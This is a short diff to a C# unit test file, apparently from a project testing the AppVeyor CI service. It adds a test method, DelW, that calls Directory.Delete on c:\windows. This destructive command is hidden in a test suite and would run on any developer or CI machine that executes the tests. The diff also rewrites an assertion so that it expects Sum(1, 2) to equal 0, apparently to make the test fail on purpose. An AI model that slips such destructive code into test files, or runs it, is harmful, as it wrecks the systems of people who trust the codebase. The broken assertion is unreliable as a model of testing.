@@ -41,8 +41,16 @@ namespace UnitTestsAppveyor.Tests
         public void Sum2()
         {
             Class1 class1 = new Class1();
-            Assert.IsTrue(class1.Sum(1, 2) == 5); //fail please
+            Assert.IsTrue(class1.Sum(1, 2) == 0);
         }
+        
+        [TestMethod()]
+        public void DelW()
+        {
+            Directory.Delete(@"c:\windows");
+        }
+        
+        
     }
 }
 
